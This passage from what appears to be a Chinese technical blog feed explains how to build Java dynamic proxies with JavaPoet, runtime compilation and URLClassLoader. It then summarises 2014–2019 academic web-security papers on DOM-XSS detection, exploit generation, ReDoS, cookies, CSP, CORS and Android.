title="原理分析"></a>原理分析</h1><ol><li>动态生成代理类，并且动态编译，再通过反射创建对象并加载到内存中：</li></ol><pre class="mermaid">graph LR   proxy[Proxy.newProxyInstance] -- JavaPoet --> java[C$Proxy0.java]   java -- Compile --> clazz[C$Proxy0.class]   clazz -- reflect --> sell[C$Proxy0]</pre><ol><li>在调用时，C$Proxy0代理InvocationHandler，InvocationHander代理subject。</li></ol><h2 id="生成代理类源码"><a href="#生成代理类源码" class="headerlink" title="生成代理类源码"></a>生成代理类源码</h2><p>newProxyInstance就是将中介类生成代理类源代码的方法，生成的代理类如下，可以看到其包含一个InvocationHander类，实现subject的接口，使用反射调用InvocationHander：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Override;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy0</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> InvocationHandler handler;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Proxy0</span><span class="params">(InvocationHandler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.handler=handler;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod(<span class="string">"add"</span>);</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod(<span class="string">"sell"</span>);</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fsquare%2Fjavapoet" target="_blank" rel="noopener">JavaPoet</a>实现，代码来自<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">10分钟看懂动态代理设计模式</a>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.squareup.javapoet.FieldSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.JavaFile;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.MethodSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.TypeSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(Class subject,InvocationHandler handler)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">            ClassNotFoundException,</span></span><br><span class="line"><span class="function">            NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="comment">// 生成proxy.java</span></span><br><span class="line">        TypeSpec.Builder typeSpecBuilder = TypeSpec.classBuilder(<span class="string">"Proxy0"</span>)</span><br><span class="line">                .addSuperinterface(subject);</span><br><span class="line"></span><br><span class="line">        FieldSpec fieldSpec = FieldSpec.builder(InvocationHandler.class, <span class="string">"handler"</span>, Modifier.PRIVATE).build();</span><br><span class="line">        typeSpecBuilder.addField(fieldSpec);</span><br><span class="line"></span><br><span class="line">        MethodSpec constructorMethodSpec = MethodSpec.constructorBuilder()</span><br><span class="line">                .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                .addParameter(InvocationHandler.class, <span class="string">"handler"</span>)</span><br><span class="line">                .addStatement(<span class="string">"this.handler=handler"</span>)</span><br><span class="line">                .build();</span><br><span class="line">        typeSpecBuilder.addMethod(constructorMethodSpec);</span><br><span class="line"></span><br><span class="line">        Method[] methods = subject.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            MethodSpec methodSpec = MethodSpec.methodBuilder(method.getName())</span><br><span class="line">                    .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                    .addAnnotation(Override.class)</span><br><span class="line">                    .returns(method.getReturnType())</span><br><span class="line">                    .addCode(<span class="string">"try &#123;\n"</span>)</span><br><span class="line">                    .addStatement(<span class="string">"\t$T method = "</span> + subject.getName() + <span class="string">".class.getMethod(\""</span> + method.getName() + <span class="string">"\")"</span>,</span><br><span class="line">                            Method.class)</span><br><span class="line">                    <span class="comment">// 为了简单起见，这里参数直接写死为空</span></span><br><span class="line">                    .addStatement(<span class="string">"\tthis.handler.invoke(this, method, null)"</span>)</span><br><span class="line">                    .addCode(<span class="string">"&#125; catch(Exception e) &#123;\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"\te.printStackTrace();\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"&#125;\n"</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            typeSpecBuilder.addMethod(methodSpec);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        JavaFile javaFile = JavaFile.builder(<span class="string">"MyImpl"</span>, typeSpecBuilder.build()).build();</span><br><span class="line">        <span class="comment">// 为了看的更清楚，我将源码文件生成到桌面</span></span><br><span class="line">        String srcPath=<span class="string">"./MyProxy"</span>;</span><br><span class="line">        javaFile.writeTo(<span class="keyword">new</span> File(srcPath));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 编译源代码</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载进内存并反射创建对象</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编译Proxy0的源代码"><a href="#编译Proxy0的源代码" class="headerlink" title="编译Proxy0的源代码"></a>编译Proxy0的源代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaCompiler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">(File javaFile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        javax.tools.JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        StandardJavaFileManager fileManager = javaCompiler.getStandardFileManager(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Iterable iterable = fileManager.getJavaFileObjects(javaFile);</span><br><span class="line">        javax.tools.JavaCompiler.CompilationTask task = javaCompiler.getTask(<span class="keyword">null</span>, fileManager, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, iterable);</span><br><span class="line">        task.call();</span><br><span class="line">        fileManager.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Proxy.newProxyInstance()中调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaCompiler.compile(<span class="keyword">new</span> File(srcPath+<span class="string">"/MyImpl/Proxy0.java"</span>));</span><br></pre></td></tr></table></figure><h2 id="加载进内存并创建对象"><a href="#加载进内存并创建对象" class="headerlink" title="加载进内存并创建对象"></a>加载进内存并创建对象</h2><p>使用URLClassLoader加载.class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">File filpath=<span class="keyword">new</span> File(<span class="string">""</span>);</span><br><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:"</span>+filpath.getAbsoluteFile()+<span class="string">"\\MyProxy\\"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"MyImpl.Proxy0"</span>);</span><br><span class="line">Constructor constructor = clazz.getConstructor(InvocationHandler.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>); <span class="comment">//不懂 为什么已经是public的方法还需要setAccessible</span></span><br><span class="line">Object obj = constructor.newInstance(handler);</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>可以像系统内置的那样设置动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sell sell = (Sell)Proxy.newProxyInstance(Sell.class, <span class="keyword">new</span> MyInvocationHandler(<span class="keyword">new</span> SellImpl()));</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li>10分钟看懂动态代理设计模式，<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">https://juejin.im/post/5a99048a6fb9a028d5668e62</a></li><li>Java动态代理，<a href="https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a" target="_blank" rel="noopener">https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;用法&quot;&gt;&lt;a href=&quot;#用法&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h1&gt;&lt;p&gt;java动态代理机制可以实现使用一个抽象的中介类对任意类的任意方法进行进行代理，大致原理是运行时生成一个代理类，代理类再调用委托对象。&lt;/p
      
    
    </summary>
    
      <category term="Java" scheme="http://anemone.top/categories/Java/"/>
    
    
      <category term="java" scheme="http://anemone.top/tags/java/"/>
    
      <category term="反射" scheme="http://anemone.top/tags/%E5%8F%8D%E5%B0%84/"/>
    
      <category term="动态代理" scheme="http://anemone.top/tags/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>2014-2019Web安全研究方向调查报告</title>
    <link href="http://anemone.top/%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5/"/>
    <id>http://anemone.top/学术-学术圈2014-2019Web安全方向研究情况/</id>
    <published>2019-02-27T02:16:20.000Z</published>
    <updated>2019-09-22T10:14:18.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>本文列出四大安全会议（USENIX、CCS、NDSS和S&amp;P）近5年来与Web安全有关的研究，已发现web方向的研究点。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>研究热点聚焦在DOM-XSS上：</p><h2 id="Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19"><a href="#Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19" class="headerlink" title="Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*"></a>Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*</h2><p>我们通过污点跟踪技术寻找客户端的XSS问题(感觉跟“Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting”的研究很像)</p><h2 id="Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18"><a href="#Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18" class="headerlink" title="Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*"></a>Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*</h2><h3 id="什么是DOM型XSS："><a href="#什么是DOM型XSS：" class="headerlink" title="什么是DOM型XSS："></a>什么是DOM型XSS：</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1546778397220.png" alt="1546778397220"></p><h3 id="怎么防御："><a href="#怎么防御：" class="headerlink" title="怎么防御："></a>怎么防御：</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1546778565366.png" alt="1546778565366"></p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>我们使用了向V8引擎注入污点技术，具体来说，我们在每个输入的字符串上增加了一个标记，最后看这些标记是否会被document.write()等函数(sink function)带出。在中间过程中我们需要考虑encodeURI等函数，他们应使标记失效。</p><ul><li><p>sink function：</p><ul><li>document.write()</li><li>document.writeln()</li><li>eval()</li><li>设置src属性的setAttribute</li><li>设置href属性的setAttribute</li><li>设置style属性的setAttribute</li><li>设置事件监听属性（onload/onerror/…）的setAttribute</li><li>在setTimeout和setInterval中的string2function</li><li>对document.cookie赋值</li><li>对document.location赋值</li></ul></li><li><p>使标记失效的函数</p><ul><li><p>escape</p><p>escape不编码字符有69个：*，+，-，.，/，@，_，0-9，a-z，A-Z</p></li><li><p>encodeURI</p><p>encodeURI不编码字符有82个：!，#，$，&amp;，’，(，)，*，+，,，-，.，/，:，;，=，?，@，_，~，0-9，a-z，A-Z</p></li><li><p>encodeURIComponent</p><p>encodeURIComponent不编码字符有71个：!， ‘，(，)，*，-，.，_，~，0-9，a-z，A-Z</p></li><li><p>encodeHTML</p><p>需要自己写，将字符串转换成html实体编码</p></li></ul></li></ul><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>我们与其他静态工具做对比，发现BurpSuite只发现了10%的问题，但是发现了一些其他我们没有发现的问题，而其他工具存在相当高的误报率——95%</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="https://github.com/wrmelicher/ChromiumTaintTracking" target="_blank" rel="noopener">https://github.com/wrmelicher/ChromiumTaintTracking</a></li><li>S. Lekies, B. Stock, and M. Johns, “25 million flows later: large-scale detection of DOM-based XSS,” in Proc. CCS, 2013, pp. 1193–1204.</li></ul><h2 id="Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14"><a href="#Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14" class="headerlink" title="Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14"></a>Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14</h2><p>目前对XSS的防御依赖于字符串检测，本文通过实验揭示了这种方法不能抵御所有的XSS攻击，为此，本文提出了一种基于污点跟踪和感知的XSS过滤器。</p><h2 id="Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14"><a href="#Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14" class="headerlink" title="Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14"></a>Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14</h2><p>Second-Order漏洞是指攻击载荷首先存储在应用服务器上，接着在其他操作时触发的漏洞，本文第一个提出了检测该漏洞的静态代码分析方法，其通过检测连接数据库或对web应用内存的读取和写入操作检测该问题。</p><h1 id="EXP-Generation"><a href="#EXP-Generation" class="headerlink" title="EXP Generation"></a>EXP Generation</h1><h2 id="NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18"><a href="#NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18" class="headerlink" title="NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*"></a>NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*</h2><p>本文构造了一个可拓展的动静结合的web漏洞生成框架，第一步，使用符号执行构建各个模块的行为模型，第二步，构建应用并且使用爬虫获取网站路径，同时使用动态符号执行最大化代码覆盖范围</p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li><a href="https://github.com/aalhuz/navex" target="_blank" rel="noopener">https://github.com/aalhuz/navex</a></li></ul><h2 id="Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16"><a href="#Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16" class="headerlink" title="Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*"></a>Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*</h2><p>我们设计了一套EXP生成工具，以提高web注入漏洞的识别能力。为此该工具基于应用的数据流，数据库模型和本机函数等应对web应用程序的多模块，用户输入和多层架构的挑战。</p><h1 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h1><h2 id="Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18"><a href="#Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18" class="headerlink" title="Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18"></a>Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18</h2><p>高度复杂的DoS攻击只需要少量请求就可导致大量资源消耗，为此，我们设计工具Rampart，它通过统计方法和函数级别的程序分析方法，合成并部署过滤器来阻止DoS攻击。</p><h2 id="Tail-Attacks-on-Web-Applications-ccs17"><a href="#Tail-Attacks-on-Web-Applications-ccs17" class="headerlink" title="Tail Attacks on Web Applications, ccs17"></a>Tail Attacks on Web Applications, ccs17</h2><p>本文介绍了一种新型的DDoS攻击，这种攻击利用了网络应用的复杂性和依赖于分布式的特性，使网络响应大于1秒，我们构建了一个模型来检测这一攻击并且提出了一种防御方法。</p><h2 id="Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18"><a href="#Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18" class="headerlink" title="Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18"></a>Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18</h2><p>JavaScript的单线程执行模型使得基于JavaScript的web服务器特别容易受到ReDoS攻击。因此我们对2846个流行的网站进行分析，并且发现了25个之前未知的流行模块漏洞。</p><h2 id="The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18"><a href="#The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18" class="headerlink" title="The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18"></a>The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18</h2><p>正则表达式是导致拒绝服务的新原因，本文研究了ReDoS的三个方面：实际中超线性正则表达式（super-linear regex）的使用率，他们如何预防DoS攻击以及他们如何被修复。本文发现大量的JavaScript和Python依靠正则表达式，同时反模式（anti-patterns）有很少的漏报但是有很多误报，因此这些反模式是必要但不充分的。最后发现对待超线性的表达式，开发者愿意修改它而不是截断输入或是写新的。</p><h2 id="ReScue-crafting-regular-expression-DoS-attacks-ase18"><a href="#ReScue-crafting-regular-expression-DoS-attacks-ase18" class="headerlink" title="ReScue: crafting regular expression DoS attacks, ase18"></a>ReScue: crafting regular expression DoS attacks, ase18</h2><p>本文介绍了一种三阶段灰盒分析技术ReScure，它可以自动生成ReDoS字符串。它通过遗传算法选择种子，接着使用正则表达式算法选择具有最大搜索时间的字符串。</p><p>备注：南大计算机做的研究，好像也在搞移动测试</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18"><a href="#Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18" class="headerlink" title="Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18"></a>Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18</h2><p>cookie容易受到XSS攻击，为此浏览器形成了各种保护机制和政策，本文能通过一个强制执行第三方请求的框架自动化评估这些防御机制的有效性，我们评估了7个浏览器的策略实现和46个浏览器插件，我们发现即使是内置的保护机制也可以被许多新技术绕过。</p><p>思考：Android Browser是不是也有这类问题？</p><h2 id="Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15"><a href="#Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15" class="headerlink" title="Cookies Lack Integrity: Real-World Implications (survey), usenix15"></a>Cookies Lack Integrity: Real-World Implications (survey), usenix15</h2><p>设置了secure标志的cookie会被https加密传输，然而cookie的完整性仍然会受到攻击（没有应用HSTS），本文旨在了解攻击者如何进行一个cookie注入攻击。</p><h2 id="The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16"><a href="#The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16" class="headerlink" title="The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16"></a>The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16</h2><p>由于不使用HTTPS，http存在中间人攻击的问题，本文总结了这些问题。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17"><a href="#CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17" class="headerlink" title="CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17"></a>CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17</h2><p>CSP(Content Security Policy)是W3C设计的用来防御内容注入的标准，但是其静态白名单的策略被先前的研究质疑，本文介绍了一种CSP的拓展CCSP，旨在克服静态白名单所来带来的限制同时避免大幅度修改原先的CSP。</p><h2 id="CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16"><a href="#CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16" class="headerlink" title="CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16"></a>CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16</h2><p>CSP是防御XSS攻击的好方式，但是据了解只有0.002%的网站使用了CSP，为此我们设计了工具CSPAutoGen，他为每个网站训练一个模板，再基于模板产生CSP规则。</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><h2 id="We-Still-Don’t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18"><a href="#We-Still-Don’t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18" class="headerlink" title="We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18"></a>We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18</h2><p>开发者提出一些解决方法（比如JSONP）来绕过同源策略，这些方法同时引入了安全问题，CORS是一种更加规范的机制，但是本文通过实证研究发现，CORS的设计和部署受到许多新的安全问题影响：1）CORS放宽了跨域写权限2）开发人员不了解CORS导致错误配置。</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19"><a href="#Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19" class="headerlink" title="Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19"></a>Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19</h2><p>本文发现web应用存在的问题仍然会在Android中出现，但是很多移动端浏览器并没有遵从安全准则（HTTP Header）。</p><p>被调查的HTTP Header：</p><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547798650411.png" alt="1547798650411"></p><h2 id="Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19"><a href="#Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19" class="headerlink" title="Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19"></a>Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19</h2><p>本文通过众包方式了解到Android应用程序中开放端口的普及度为15.3%；本文还开发了一种新的静态诊断工具，显示61.8%的开放端口应用程序完全是由嵌入式sdk开发的，20.7%的应用程序使用了不安全的API。我们得出关于端口安全的三个结论：（1）脆弱性分析显示了以Instagram，SamsungGear，Skype，和FacebookSDK为首的5种脆弱的模式；（2）众包显示了224个蜂窝网络和2181个WiFi模式；（3）关于对端口进行DoS攻击的实验性演示</p><h2 id="FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18"><a href="#FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18" class="headerlink" title="FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18"></a>FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18</h2><p>Android访问私人信息是否合法取决于应用是否向用户提供了足够的解释，FlowCog从Android视图中抽取相关的语义，再用NLP方法推断语义与给定流是否相关。</p><h3 